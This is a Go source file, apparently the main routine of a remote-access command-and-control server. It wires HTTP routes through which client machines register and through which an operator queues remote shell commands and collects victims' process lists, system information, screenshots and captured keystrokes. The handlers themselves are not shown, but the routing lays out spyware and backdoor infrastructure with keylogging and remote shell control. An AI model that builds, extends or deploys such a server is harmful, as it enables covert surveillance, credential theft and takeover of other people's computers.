package main

import "x_server/utils"
import "github.com/gin-gonic/gin"
import "log"
import "fmt"

const PORT = 10013

func main() {
	
	utils.DB = utils.GetNewDbClient()
	if (utils.DB == nil) {
		log.Fatalf("Connection to database server was failed, and that was fatal ...");
	}

	utils.MakeMigrations(utils.DB)

	

	router := gin.Default()
	
	
	router.GET("/clients", utils.PollClients)
	router.POST("/register_client", utils.AddClient);
	router.POST("/update_computer/:client_id", utils.UpdateClientOsInfo);
	router.POST("/update_processes/:client_id", utils.UpdateClientProcessesById)
	
	router.GET("/poll_about_command/:cmd_type", utils.PollCommand)
	router.POST("/update_command/:cmd_type", utils.UpdateCommand)

	router.GET("/poll_status/:cmd_type/:client_addr", utils.PollCommandStatus)
	router.POST("/add_command/:cmd_type/:client_addr", utils.AddCommand)
	router.DELETE("/remove_command/:cmd_type/:client_addr", utils.RemoveCommand)
	router.GET("/get_processes/:client_addr", utils.GetProcesses)
	router.GET("/get_osinfo/:client_addr", utils.GetClientOSInfo)

	router.HEAD("/check_failure/:cmd_type", utils.CheckAboutCommandFailure)
	router.POST("/keep_alive", utils.KeepAliveClient)
	router.POST("/disconnect", utils.DisconnectClient)
	router.POST("/post_screen", utils.PostClientScreenshot)
	router.GET("/get_and_remove_screen/:client_addr", utils.FetchClientLastScreen)
	
	router.POST("/post_kbdata", utils.AddClientKeyboardData)
	router.GET("/get_kbdata/:client_addr", utils.GetClientKeyboardData)

	/* ! shell */
	router.POST("/shell/enque/:client_addr", utils.EnqueueShellCommand)
	router.POST("/shell/deque/:client_addr", utils.DequeueShellCommand)
	router.POST("/shell/update_head", utils.UpdateHeadShellCommand)
	router.GET("/shell/get_head_admin/:client_addr", utils.PullHeadShellCommand)
	router.GET("/shell/get_head_client", utils.PullHeadShellCommandC)
	router.POST("/shell/clear/:client_addr", utils.ClearClientCommandQueue)
	
	log.Println("Server started!")
	router.Run(fmt.Sprintf(":%d", PORT));
}